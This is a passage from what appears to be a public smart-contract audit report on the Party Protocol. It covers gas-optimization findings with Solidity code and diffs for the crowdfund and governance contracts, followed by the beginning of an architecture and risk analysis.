    address payable public feeRecipient;
    /// @notice The timestamp of the last time `rageQuit()` was called.
    uint40 public lastRageQuitTimestamp;
    /// @notice The hash of the list of precious NFTs guarded by the party.
    bytes32 public preciousListHash;
    /// @notice The last proposal ID that was used. 0 means no proposals have been made.
    uint256 public lastProposalId;
    /// @notice Whether an address is a party host.
    mapping(address => bool) public isHost;
    /// @notice The last person a voter delegated its voting power to.
    mapping(address => address) public delegationsByVoter;
    /// @notice Number of hosts for this party
    uint8 public numHosts;
    /// @notice ProposalState by proposal ID.
    mapping(uint256 => ProposalState) private _proposalStateByProposalId;
    /// @notice Snapshots of voting power per user, each sorted by increasing time.
    mapping(address => VotingPowerSnapshot[]) private _votingPowerSnapshotsByVoter;
```

```diff
diff --git a/contracts/party/PartyGovernance.sol b/contracts/party/PartyGovernance.sol
index 551dae9..e117456 100644
--- a/contracts/party/PartyGovernance.sol
+++ b/contracts/party/PartyGovernance.sol
@@ -192,6 +192,8 @@ abstract contract PartyGovernance is

     /// @notice Whether the DAO has emergency powers for this party.
     bool public emergencyExecuteDisabled;
+        /// @notice Number of hosts for this party
+    uint8 public numHosts;
     /// @notice Distribution fee bps.
     uint16 public feeBps;
     /// @notice Distribution fee recipient.
@@ -206,8 +208,7 @@ abstract contract PartyGovernance is
     mapping(address => bool) public isHost;
     /// @notice The last person a voter delegated its voting power to.
     mapping(address => address) public delegationsByVoter;
-    /// @notice Number of hosts for this party
-    uint8 public numHosts;
+
     /// @notice ProposalState by proposal ID.
     mapping(uint256 => ProposalState) private _proposalStateByProposalId;
     /// @notice Snapshots of voting power per user, each sorted by increasing t
```

## Use the already cached variable instead of reading from storage (Save 1 SLOAD: 100 Gas)

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L228-L243

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
228:        uint96 maxTotalContributions_ = maxTotalContributions;
229:        if (newTotalContributions >= maxTotalContributions_) {
230:            totalContributions = maxTotalContributions_;

238:            uint96 refundAmount = newTotalContributions - maxTotalContributions;
239:            if (refundAmount > 0) {
240:                amount -= refundAmount;
241:                payable(msg.sender).transferEth(refundAmount);
242:            }
243:        } else {
```

The variable `maxTotalContributions` has already been cached on Line 228.

```diff
diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol
index db0e78d..7a717ac 100644
--- a/contracts/crowdfund/ETHCrowdfundBase.sol
+++ b/contracts/crowdfund/ETHCrowdfundBase.sol
@@ -235,7 +235,7 @@ contract ETHCrowdfundBase is Implementation {
             _finalize(maxTotalContributions_);

             // Refund excess contribution.
-            uint96 refundAmount = newTotalContributions - maxTotalContributions;
+            uint96 refundAmount = newTotalContributions - maxTotalContributions_;
             if (refundAmount > 0) {
                 amount -= refundAmount;
                 payable(msg.sender).transferEth(refundAmount);
```

## Modifier execution order can help save an entire SLOAD + an external call (Save 2100+ Gas)

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L841-L851

```solidity
File: /contracts/party/PartyGovernance.sol
841:    function emergencyExecute(
842:        address targetAddress,
843:        bytes calldata targetCallData,
844:        uint256 amountEth
845:    ) external payable onlyPartyDao onlyWhenEmergencyExecuteAllowed onlyDelegateCall {
846:        (bool success, bytes memory res) = targetAddress.call{ value: amountEth }(targetCallData);
847:        if (!success) {
848:            res.rawRevert();
849:        }
850:        emit EmergencyExecute(targetAddress, targetCallData, amountEth);
851:    }
```

The function above uses 3 modifies ie `onlyPartyDao` and `onlyWhenEmergencyExecuteAllowed` and `onlyDelegateCall`. According to solidity docs, modifiers are executed in the order they are presented meaning `onlyPartyDao` will be check first.

Now if we peek into their implementation, we see the following:

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L231-L239

```solidity
    modifier onlyPartyDao() {
        {
            address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);
            if (msg.sender != partyDao) {
                revert NotAuthorized();
            }
        }
        _;
    }
```

The modifier `onlyPartyDao()` makes an external call to `getAddress()` then checks it against `msg.sender` reverting when they don't match.

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L251-L256

```solidity
    modifier onlyWhenEmergencyExecuteAllowed() {
        if (emergencyExecuteDisabled) {
            revert OnlyWhenEmergencyActionsAllowedError();
        }
        _;
    }
```

The modifier `onlyWhenEmergencyExecuteAllowed` involves reading a state variable `emergencyExecuteDisabled`.

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/utils/Implementation.sol#L22-L27

```solidity
    modifier onlyDelegateCall() virtual {
        if (address(this) == implementation) {
            revert OnlyDelegateCallError();
        }
        _;
    }
```

The last modifier `onlyDelegateCall()` simply reads an Immutable variable which in terms of gas consumption is way cheaper compared to the other modifiers. Since we do revert if any of the modifier condition is not met, it would be wise to first check the condition in the modifier `onlyDelegateCall()` since it's cheaper. This way, if we do revert, the gas spent would be lower.

Refactor the code as follows:

```diff
diff --git a/contracts/party/PartyGovernance.sol b/contracts/party/PartyGovernance.sol
index 551dae9..19104d2 100644
--- a/contracts/party/PartyGovernance.sol
+++ b/contracts/party/PartyGovernance.sol
@@ -842,7 +842,7 @@ abstract contract PartyGovernance is
         address targetAddress,
         bytes calldata targetCallData,
         uint256 amountEth
-    ) external payable onlyPartyDao onlyWhenEmergencyExecuteAllowed onlyDelegateCall {
+    ) external payable onlyDelegateCall onlyPartyDao onlyWhenEmergencyExecuteAllowed  {
         (bool success, bytes memory res) = targetAddress.call{ value: amountEth }(targetCallData);
         if (!success) {
             res.rawRevert();
```

## Optimize this code by only casting if indeed `msg.value > 0` (Saves gas for both `>0` and `== 0` scenarios)

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/InitialETHCrowdfund.sol#L138-L151

```solidity
File: /contracts/crowdfund/InitialETHCrowdfund.sol
138:        // If the deployer passed in some ETH during deployment, credit them
139:        // for the initial contribution.
140:        uint96 initialContribution = msg.value.safeCastUint256ToUint96();
141:        if (initialContribution > 0) {
142:            // If this contract has ETH, either passed in during deployment or
143:            // pre-existing, credit it to the `initialContributor`.
144:            _contribute(
145:                crowdfundOpts.initialContributor,
146:                crowdfundOpts.initialDelegate,
147:                initialContribution,
148:                0,
149:                ""
150:            );
151:        }
```

In the above, we are casting the value of `msg.value` then checking if it is greater than `0`. We should do the opposite, validate if it's greater than `0` and only cast if so.

```diff
diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol
index 29ade81..f657082 100644
--- a/contracts/crowdfund/InitialETHCrowdfund.sol
+++ b/contracts/crowdfund/InitialETHCrowdfund.sol
@@ -137,8 +137,8 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {

         // If the deployer passed in some ETH during deployment, credit them
         // for the initial contribution.
-        uint96 initialContribution = msg.value.safeCastUint256ToUint96();
-        if (initialContribution > 0) {
+        if (msg.value > 0) {
+            uint96 initialContribution = msg.value.safeCastUint256ToUint96();
             // If this contract has ETH, either passed in during deployment or
             // pre-existing, credit it to the `initialContributor`.
             _contribute(
```

## `PartyGovernanceNFT.sol.setRageQuit()`: We can optimize this function

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/party/PartyGovernanceNFT.sol#L318-L323

```solidity
File: /contracts/party/PartyGovernanceNFT.sol
318:    function setRageQuit(uint40 newRageQuitTimestamp) external {
319:        _assertHost();
320:        // Prevent disabling ragequit after initialization.
321:        if (newRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY) {
322:            revert CannotDisableRageQuitAfterInitializationError();
323:        }
```

The function `setRageQuit` calls an internal function `_assertHost()`  which has the following implementation:

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/party/PartyGovernance.sol#L216-L220

```solidity
    function _assertHost() internal view {
        if (!isHost[msg.sender]) {
            revert NotAuthorized();
        }
    }
```

This function, makes a state read `isHost[msg.sender]` and reverts if the check does not pass. If we go back to the main function (ie `setRageQuit()`) we see there is a second check (ie ` if (newRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY)`) which only reads a function parameter and compares it against a constant variable. 

The second check is very cheap compared to the `isHost` check. If we call the function `_assertHost()` first, then we fail the second check, we would have wasted an entire SLOAD. Reordering this check allows us to minimize the gas consumed in case of a revert:

```diff
diff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol
index 997b00c..765d403 100644
--- a/contracts/party/PartyGovernanceNFT.sol
+++ b/contracts/party/PartyGovernanceNFT.sol
@@ -316,11 +316,11 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {
     /// @notice Set the timestamp until which ragequit is enabled.
     /// @param newRageQuitTimestamp The new ragequit timestamp.
     function setRageQuit(uint40 newRageQuitTimestamp) external {
-        _assertHost();
         // Prevent disabling ragequit after initialization.
         if (newRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY) {
             revert CannotDisableRageQuitAfterInitializationError();
         }
+        _assertHost();
```

## Avoid making any `SSTORE`s before validating all parameters (Save some `SSTORES` in case of reverts)

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L140-L172

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
140:    function _initialize(ETHCrowdfundOptions memory opts) internal {
141:        // Set the minimum and maximum contribution amounts.
142:        if (opts.minContribution > opts.maxContribution) {
143:            revert MinGreaterThanMaxError(opts.minContribution, opts.maxContribution);
144:        }
145:        minContribution = opts.minContribution;
146:        maxContribution = opts.maxContribution;
147:        // Set the min total contributions.
148:        if (opts.minTotalContributions > opts.maxTotalContributions) {
149:            revert MinGreaterThanMaxError(opts.minTotalContributions, opts.maxTotalContributions);
150:        }
151:        minTotalContributions = opts.minTotalContributions;
152:        // Set the max total contributions.
153:        if (opts.maxTotalContributions == 0) {

157:            revert MaxTotalContributionsCannotBeZeroError(opts.maxTotalContributions);
158:        }
159:        maxTotalContributions = opts.maxTotalContributions;
160:        // Set the party crowdfund is for.
161:        party = opts.party;
162:        // Set the crowdfund start and end timestamps.
163:        expiry = uint40(block.timestamp + opts.duration);
164:        // Set the exchange rate.
165:        if (opts.exchangeRateBps == 0) revert InvalidExchangeRateError(opts.exchangeRateBps);
166:        exchangeRateBps = opts.exchangeRateBps;
167:        // Set the funding split and its recipient.
168:        fundingSplitBps = opts.fundingSplitBps;
169:        fundingSplitRecipient = opts.fundingSplitRecipient;
170:        // Set whether to disable contributing for existing card.
171:        disableContributingForExistingCard = opts.disableContributingForExistingCard;
172:    }
```

To avoid wasting gas making `sstores`, it is recommended we do all the checks first:

```diff
diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol
index db0e78d..7d78cb1 100644
--- a/contracts/crowdfund/ETHCrowdfundBase.sol
+++ b/contracts/crowdfund/ETHCrowdfundBase.sol
@@ -138,31 +138,31 @@ contract ETHCrowdfundBase is Implementation {
     // Initialize storage for proxy contracts, credit initial contribution (if
     // any), and setup gatekeeper.
     function _initialize(ETHCrowdfundOptions memory opts) internal {
-        // Set the minimum and maximum contribution amounts.
         if (opts.minContribution > opts.maxContribution) {
             revert MinGreaterThanMaxError(opts.minContribution, opts.maxContribution);
         }
-        minContribution = opts.minContribution;
-        maxContribution = opts.maxContribution;
-        // Set the min total contributions.
         if (opts.minTotalContributions > opts.maxTotalContributions) {
             revert MinGreaterThanMaxError(opts.minTotalContributions, opts.maxTotalContributions);
         }
-        minTotalContributions = opts.minTotalContributions;
-        // Set the max total contributions.
         if (opts.maxTotalContributions == 0) {
             // Prevent this because when `maxTotalContributions` is 0 the
             // crowdfund is invalid in `getCrowdfundLifecycle()` meaning it has
             // never been initialized.
             revert MaxTotalContributionsCannotBeZeroError(opts.maxTotalContributions);
         }
+        if (opts.exchangeRateBps == 0) revert InvalidExchangeRateError(opts.exchangeRateBps);
+        // Set the minimum and maximum contribution amounts.
+        minContribution = opts.minContribution;
+        maxContribution = opts.maxContribution;
+        // Set the min total contributions.
+        minTotalContributions = opts.minTotalContributions;
+        // Set the max total contributions.
         maxTotalContributions = opts.maxTotalContributions;
         // Set the party crowdfund is for.
         party = opts.party;
         // Set the crowdfund start and end timestamps.
         expiry = uint40(block.timestamp + opts.duration);
         // Set the exchange rate.
-        if (opts.exchangeRateBps == 0) revert InvalidExchangeRateError(opts.exchangeRateBps);
         exchangeRateBps = opts.exchangeRateBps;
         // Set the funding split and its recipient.
         fundingSplitBps = opts.fundingSplitBps;    
```

## Due to how short circuit works, we can save an entire SLOAD by performing sloads only when needed (Save 2100 Gas)

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L260-L267

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
260:        // Subtract fee from contribution amount if applicable.
261:        address payable fundingSplitRecipient_ = fundingSplitRecipient;
262:        uint16 fundingSplitBps_ = fundingSplitBps;
263:        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
264:            // Removes funding split from contribution amount in a way that
265:            // avoids rounding errors for very small contributions <1e4 wei.
266:            amount = (amount * (1e4 - fundingSplitBps_)) / 1e4;
267:        }
```

The condition check on line 263 tries to validate two variables, `fundingSplitRecipient_` and `fundingSplitBps_`. For the code inside the block to be executed, both of these checks should pass: `fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0`.

The variables `fundingSplitRecipient_` and `fundingSplitBps_` are local variables that have been cached in the lines above and represent the state variables `fundingSplitRecipient_` and `fundingSplitBps_` respectively. To assign the local variables, it means we are making two state loads (SLOADs).

According to rules of short circuit if this check `fundingSplitRecipient_ != address(0)` fails, then we wouldn't bother do the second part of those checks. Meaning the state read `uint16 fundingSplitBps_ = fundingSplitBps;` here would not be utilized. Thus, we just wasted an entire SLOAD (2100 Gas since it's cold). We can rewrite the `if` statement to check the conditions separately which allows us to only do the second SLOAD after we confirm the first check passes.

```diff
diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol
index db0e78d..2498c69 100644
--- a/contracts/crowdfund/ETHCrowdfundBase.sol
+++ b/contracts/crowdfund/ETHCrowdfundBase.sol
@@ -259,11 +259,13 @@ contract ETHCrowdfundBase is Implementation {

         // Subtract fee from contribution amount if applicable.
         address payable fundingSplitRecipient_ = fundingSplitRecipient;
-        uint16 fundingSplitBps_ = fundingSplitBps;
-        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
+        if (fundingSplitRecipient_ != address(0)){
+            uint16 fundingSplitBps_ = fundingSplitBps;
+             if (fundingSplitBps_ > 0) {
             // Removes funding split from contribution amount in a way that
             // avoids rounding errors for very small contributions <1e4 wei.
             amount = (amount * (1e4 - fundingSplitBps_)) / 1e4;
+             }
         }
```

## Avoid an SLOAD by taking advantage of short circuit (1 SLOAD: 2100 Gas)

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L278-L289

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
278:    function convertVotingPowerToContribution(
279:        uint96 votingPower
280:    ) public view returns (uint96 amount) {
281:        amount = (votingPower * 1e4) / exchangeRateBps;

283:        // Add back funding split to contribution amount if applicable.
284:        address payable fundingSplitRecipient_ = fundingSplitRecipient;
285:        uint16 fundingSplitBps_ = fundingSplitBps;
286:        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
287:            amount = (amount * 1e4) / (1e4 - fundingSplitBps_);
288:        }
289:    }
```

```diff
diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol
index db0e78d..087a96f 100644
--- a/contracts/crowdfund/ETHCrowdfundBase.sol
+++ b/contracts/crowdfund/ETHCrowdfundBase.sol
@@ -282,9 +282,11 @@ contract ETHCrowdfundBase is Implementation {

         // Add back funding split to contribution amount if applicable.
         address payable fundingSplitRecipient_ = fundingSplitRecipient;
-        uint16 fundingSplitBps_ = fundingSplitBps;
-        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
-            amount = (amount * 1e4) / (1e4 - fundingSplitBps_);
+        if (fundingSplitRecipient_ != address(0)) {
+            uint16 fundingSplitBps_ = fundingSplitBps;
+            if (fundingSplitBps_ > 0) {
+                 amount = (amount * 1e4) / (1e4 - fundingSplitBps_);
+            }
         }
     }
```

## Avoid making one SLOAD by utilizing the rules of short circuit (Save 2100 Gas)

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L317-L326

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
317:    function _finalize(uint96 totalContributions_) internal {
318:        // Finalize the crowdfund.
319:        delete expiry;

321:        // Transfer funding split to recipient if applicable.
322:        address payable fundingSplitRecipient_ = fundingSplitRecipient;
323:        uint16 fundingSplitBps_ = fundingSplitBps;
324:        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
325:            totalContributions_ -= (totalContributions_ * fundingSplitBps_) / 1e4;
326:        }
```

```diff
diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol
index db0e78d..4528750 100644
--- a/contracts/crowdfund/ETHCrowdfundBase.sol
+++ b/contracts/crowdfund/ETHCrowdfundBase.sol
@@ -320,9 +320,11 @@ contract ETHCrowdfundBase is Implementation {

         // Transfer funding split to recipient if applicable.
         address payable fundingSplitRecipient_ = fundingSplitRecipient;
-        uint16 fundingSplitBps_ = fundingSplitBps;
-        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {
-            totalContributions_ -= (totalContributions_ * fundingSplitBps_) / 1e4;
+        if (fundingSplitRecipient_ != address(0)) {
+            uint16 fundingSplitBps_ = fundingSplitBps;
+            if (fundingSplitBps_ > 0) {
+                totalContributions_ -= (totalContributions_ * fundingSplitBps_) / 1e4;
+            }
         }
```

## Prioritize making cheaper checks first to reduce gas consumption in revert cases

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L339-L344

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
339:    function sendFundingSplit() external returns (uint96 splitAmount) {
340:        // Check that the crowdfund is finalized.
341:        CrowdfundLifecycle lc = getCrowdfundLifecycle();
342:        if (lc != CrowdfundLifecycle.Finalized) revert WrongLifecycleError(lc);

344:        if (fundingSplitPaid) revert FundingSplitAlreadyPaidError();
```

We are calling the function `getCrowdfundLifecycle()` which has the following implementation:

https://github.com/code-423n4/2023-10-party/blob/0ce3819de173f7688c9c834ce2cc758dd03c9bd2/contracts/crowdfund/ETHCrowdfundBase.sol#L175-L194

```solidity
175:    function getCrowdfundLifecycle() public view returns (CrowdfundLifecycle lifecycle) {
176:        if (maxTotalContributions == 0) {
177:            return CrowdfundLifecycle.Invalid;
178:        }

180:        uint256 expiry_ = expiry;
181:        if (expiry_ == 0) {
182:            return CrowdfundLifecycle.Finalized;
183:        }

185:        if (block.timestamp >= expiry_) {
186:            if (totalContributions >= minTotalContributions) {
187:                return CrowdfundLifecycle.Won;
188:            } else {
189:                return CrowdfundLifecycle.Lost;
190:            }
191:        }

193:        return CrowdfundLifecycle.Active;
194:    }
```

We have some checks to determine the value of the variable `lifecycle`. Worst case is we read several state variables ie `maxTotalContributions,expiry,totalContributions, minTotalContributions` to get the return value.

Going back to the function `sendFundingSplit()` we have another check ` if (fundingSplitPaid)` which only reads one state variable; this is cheaper compared to the check `lc != CrowdfundLifecycle.Finalized`. We can refactor the code as follows to save some gas in case of a revert:

```diff
     /// @notice Send the funding split to the recipient if applicable.
     function sendFundingSplit() external returns (uint96 splitAmount) {
+        if (fundingSplitPaid) revert FundingSplitAlreadyPaidError();
+
         // Check that the crowdfund is finalized.
         CrowdfundLifecycle lc = getCrowdfundLifecycle();
         if (lc != CrowdfundLifecycle.Finalized) revert WrongLifecycleError(lc);

-        if (fundingSplitPaid) revert FundingSplitAlreadyPaidError();
-
         address payable fundingSplitRecipient_ = fundingSplitRecipient;
         uint16 fundingSplitBps_ = fundingSplitBps;
         if (fundingSplitRecipient_ == address(0) || fundingSplitBps_ == 0) {
```

## Validate all parameters first before performing any other operations if there's no side effects

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L275-L304

```solidity
File: /contracts/party/PartyGovernance.sol
275:    ) internal virtual {
276:        // Check BPS are valid.
277:        if (govOpts.feeBps > 1e4) {
278:            revert InvalidBpsError(govOpts.feeBps);
279:        }
280:        if (govOpts.passThresholdBps > 1e4) {
281:            revert InvalidBpsError(govOpts.passThresholdBps);
282:        }
283:        // Initialize the proposal execution engine.
284:        _initProposalImpl(
285:            IProposalExecutionEngine(_GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)),
286:            abi.encode(proposalEngineOpts)
287:        );
288:        // Set the governance parameters.
289:        _getSharedProposalStorage().governanceValues = GovernanceValues({
290:            voteDuration: govOpts.voteDuration,
291:            executionDelay: govOpts.executionDelay,
292:            passThresholdBps: govOpts.passThresholdBps,
293:            totalVotingPower: govOpts.totalVotingPower
294:        });
295:        numHosts = uint8(govOpts.hosts.length);
296:        // Set fees.
297:        feeBps = govOpts.feeBps;
298:        feeRecipient = govOpts.feeRecipient;
299:        // Set the precious list.
300:        _setPreciousList(preciousTokens, preciousTokenIds);
301:        // Set the party hosts.
302:        if (govOpts.hosts.length > type(uint8).max) {
303:            revert TooManyHosts();
304:        }
```

We are making some state writes (`SSTORE`), then at the end we have an `if` check to validate that `govOpts.hosts.length > type(uint8).max`. If the check does not pass, the code reverts and all the `SSTORE`s will also be reverted. As such, it would be more gas efficient to first do the validation and only write to state if all checks pass.

```diff
diff --git a/contracts/party/PartyGovernance.sol b/contracts/party/PartyGovernance.sol
index 551dae9..54fbe84 100644
--- a/contracts/party/PartyGovernance.sol
+++ b/contracts/party/PartyGovernance.sol
@@ -280,6 +280,9 @@ abstract contract PartyGovernance is
         if (govOpts.passThresholdBps > 1e4) {
             revert InvalidBpsError(govOpts.passThresholdBps);
         }
+        if (govOpts.hosts.length > type(uint8).max) {
+            revert TooManyHosts();
+        }
         // Initialize the proposal execution engine.
         _initProposalImpl(
             IProposalExecutionEngine(_GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)),
@@ -299,9 +302,6 @@ abstract contract PartyGovernance is
         // Set the precious list.
         _setPreciousList(preciousTokens, preciousTokenIds);
         // Set the party hosts.
-        if (govOpts.hosts.length > type(uint8).max) {
-            revert TooManyHosts();
-        }
         for (uint256 i = 0; i < govOpts.hosts.length; ++i) {
             isHost[govOpts.hosts[i]] = true;
         }
```

## Uncheck arithmetic operations that cannot `underflow`/`overflow` (The bot missed these)

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L1033-L1039

```solidity
File: /contracts/party/PartyGovernance.sol
1033:        if (n != 0) {
1034:            VotingPowerSnapshot memory lastSnap = voterSnaps[n - 1];
1035:            if (lastSnap.timestamp == snap.timestamp) {
1036:                voterSnaps[n - 1] = snap;
1037:                return;
1038:            }
1039:        }
```

Due to the check on line 1033, we know `n` will always be greater than `0` so the lowest value will be `1`. This means our subtraction operation `n-1` cannot `overflow`. We can wrap the whole of this in unchecked block:

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernance.sol#L1048-L1050

```solidity
File: /contracts/party/PartyGovernance.sol
1048:        if (n != 0) {
1049:            snap = voterSnaps[n - 1];
1050:        }
```

The operation `n-1` cannot `overflow` due to the check on Line 1048.

https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/crowdfund/ETHCrowdfundBase.sol#L238

```solidity
File: /contracts/crowdfund/ETHCrowdfundBase.sol
238:            uint96 refundAmount = newTotalContributions - maxTotalContributions;
```

The operation `newTotalContributions - maxTotalContributions` cannot overflow since it can only be performed  if `newTotalContributions >= maxTotalContributions_` where `maxTotalContributions_` `== ``maxTotalContributions`.

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/367#issuecomment-1821508189)**

***

# Audit Analysis

For this audit, 13 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-party-findings/issues/243) by **catellatech** received the top score from the judge.

*The following wardens also submitted reports: [pavankv](https://github.com/code-423n4/2023-10-party-findings/issues/357), [0xSmartContract](https://github.com/code-423n4/2023-10-party-findings/issues/149), [Bauchibred](https://github.com/code-423n4/2023-10-party-findings/issues/581), [SAAJ](https://github.com/code-423n4/2023-10-party-findings/issues/567), [hunter\_w3b](https://github.com/code-423n4/2023-10-party-findings/issues/440), [clara](https://github.com/code-423n4/2023-10-party-findings/issues/420), [kaveyjoe](https://github.com/code-423n4/2023-10-party-findings/issues/395), [ZanyBonzy](https://github.com/code-423n4/2023-10-party-findings/issues/282), [K42](https://github.com/code-423n4/2023-10-party-findings/issues/266), [Myd](https://github.com/code-423n4/2023-10-party-findings/issues/71), [foxb868](https://github.com/code-423n4/2023-10-party-findings/issues/62), and [0xbrett8571](https://github.com/code-423n4/2023-10-party-findings/issues/60).*

## Party Protocol Smart Contracts Analysis

## 1. Party Protocol: A Comprehensive Overview
The Party Protocol aims to establish a standard for group coordination, providing on-chain functionality for essential group behaviors. 

These behaviors include:
1. **Formation**: Bringing a group together and pooling resources.
2. **Coordination**: Making collective decisions and taking actions.
3. **Distribution**: Sharing resources among group members.

### The protocol has two primary phases: 
Crowdfund and Governance.
1. **Crowdfund**: In this phase, users contribute ETH to become members of a group (Party), granting them voting rights and proportional ownership of the Party.
2. **Governance**: In the governance phase, Party members can create and vote on proposals to execute actions as a group.

Contributions during the Crowdfund phase are a primary means of creating and joining Parties. Crowdfund contracts enable groups to pool resources in various ways and can be tailored to specific behaviors (e.g. acquiring NFTs, raising ETH for a treasury, etc.).

The Crowdfund phase focuses on forming and financing Parties, while the Governance phase involves decision-making and action execution as a group.

*Note: To review the diagrams provided throughout the remainder of this report, see [here](https://github.com/code-423n4/2023-10-party-findings/issues/243).*

## 2. Main Contracts and Their Analysis Through Diagrams

### Party Protocol Scope:

**InitialETHCrowdfund.sol** - The contract it is used to conduct an initial fundraising for creating new **parties** or **groups**.

**ETHCrowdfundBase.sol** - The base contract for **InitialETHCrowdfund**

**PartyGovernance.sol** - This contract serves as the foundation for the Party contract within the protocol. It encapsulates the essential governance logic governing the behavior of parties.

**PartyGovernanceNFT.sol** - This contract serves as the foundational logic for tokens within the Party protocol, and it is inherited by the Party contract, which is the core component of the protocol.

**ProposalExecutionEngine.sol** - This contract is invoked via `delegatecall` by parties to handle the execution logic associated with proposals. Parties also implement a fallback function that performs a static delegate call to interact with the `ProposalExecutionEngine`.

**ProposalStorage.sol** - This contract facilitates communication and data management between the `PartyGovernance` and `ProposalExecutionEngine` contracts.

**SetGovernanceParameterProposal.sol** - A new proposal type that allows setting governance parameters for the party.

**SetSignatureValidatorProposal.sol** - Abstract contract that handles proposals related to setting or updating signature validators for specific signature hashes.

**OffChainSignatureValidator.sol** - This contract provides a mechanism for parties in the Party protocol to validate off-chain signatures. It checks the validity of the signature, ensures the signer is a member of the party with sufficient voting power, and applies a customizable signing threshold for added security.

**Implementation.sol** - This contract serves as a utility for implementation contracts utilized through a proxy. It offers helper functions designed to facilitate the interaction between implementation contracts and their proxies.

## 3. Approach taken in evaluating the codebase

**High-level overview:** I analyzed the overall codebase in one iteration to get a high-level understanding of the code structure and functionality.

**Documentation review:** I studied the documentation to understand the purpose of each contract, its functionality, and how it is connected with other contracts.

**Literature review:** I read old audits and known findings, as well as the bot races findings.

**Testing setup:** I set up my testing environment and ran the tests to ensure that all tests passed. Used yarn and hardhat to test this protocol or foundry as well.

**Detailed analysis:** I started with the detailed analysis of the code base, line by line. I took the necessary notes to ask some questions to the sponsors.

## 4. Party Protocol: Architecture

The architecture is designed to enable the decentralized creation and management of groups (Parties) through participation in crowdfunds. Each type of crowdfund has specific logic for its purpose, and the Party contract acts as the core for governance and party asset management.

There is always room for improvements and optimizations in the architectural design.

**Usability**: Simplify the user experience as much as possible, from participating in crowdfunds to managing governance and party assets.

**Monitoring and Analytics:** Implement monitoring and analytics tools to better understand protocol behavior and provide valuable insights for decision-making.
  
**User-Friendliness**: The architecture should be as intuitive as possible for end-users. This might involve a more user-friendly user interface or the automation of processes that currently require manual action.
  
**Education and Outreach**: Ensuring that users fully understand how the architecture works and how they can get the most out of it is essential. This could include educational resources and a robust documentation base.

## 5. Systemic and Centralization Risks

### Systematic Risks:

- Inefficient Governance: Incapacity to make efficient and fair decisions through the governance process could result in stagnation or suboptimal decisions.

- Limited Interoperability: Lack of interoperability with other protocols may limit users' options and flexibility.

### Centralization Risks:

